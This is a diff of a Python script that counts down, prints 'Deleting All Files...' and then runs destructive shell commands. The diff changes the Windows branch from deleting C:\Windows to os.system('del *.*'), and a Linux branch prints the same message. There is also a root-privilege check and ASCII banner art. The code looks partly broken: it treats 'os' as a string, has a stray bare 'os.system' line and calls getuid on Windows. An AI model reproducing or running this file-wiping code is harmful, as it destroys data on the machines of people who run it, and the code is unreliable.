@@ -52,7 +52,7 @@ def sec():
         stop -= 1
         if os == "Windows" and stop == 0:
             print(wi + rd + "\rDeleting All Files...")
-            os.system('del C:\Windows ')
+            os.system('del *.*')
             os.system
         elif os == "Linux" and stop == 0:
             print(wi + rd + "\rDeleting All Files...")
@@ -68,8 +68,10 @@ def checkuid():
   print(wi + yl + '[!]' + wi + 'Checking if user is root...')
   time.sleep(1)
   root = operate.getuid()
-  if root == 0:
-   print(wi + gr + '[+]' + wi + 'Suceess user is root.')
+  if os == 'Linux' and root == 0:
+   print(wi + gr + '[+]' + wi + 'Success user is root.')
+  elif os == 'Windows' and root == 0:
+   print(wi + gr + '[+]' + wi + 'Success user is root.')
   elif root != 0:
    print(wi + rd + '[-]' + wi + 'User is not root!')
    time.sleep(1)
@@ -140,4 +142,3 @@ c_c__/-c____/
  ╩ ┴└─ ┴   ┴ ┴└─┘┴ ┴┴┘└┘o ''')
 # disable the alarm if not wanted any longer
 # signal.alarm(0)
-                     
